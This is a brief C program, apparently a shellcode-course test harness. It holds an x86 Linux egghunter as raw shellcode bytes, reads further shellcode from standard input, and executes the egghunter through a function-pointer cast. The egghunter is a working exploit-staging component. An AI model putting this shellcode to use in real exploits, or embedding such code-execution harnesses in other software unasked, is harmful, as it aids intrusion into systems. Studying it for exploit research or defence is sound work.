#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

char egghunter[]=\
		 "\xbe\x46\x47\x47\x53\x4e\x31\xc9\xb1\x0c\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x89\xc8\xcd\x80\x3c\xf2\x74\xef\x3b\x32\x75\xf0\xff\xe3"
;

int main(){
	char *shellcode = (char *)malloc(2048);
	int payload_len = read(0, shellcode, 2048);
	if (payload_len <= 0){
		printf("Please enter some shellcode into STDIN.\n");
		exit(1);
	}
        printf("Shellcode Length:  %d\n", strlen(shellcode));
	printf("Egg Hunter length: %d\n", strlen(egghunter));
        int (*ret)() = (int(*)())egghunter;
        ret();
}

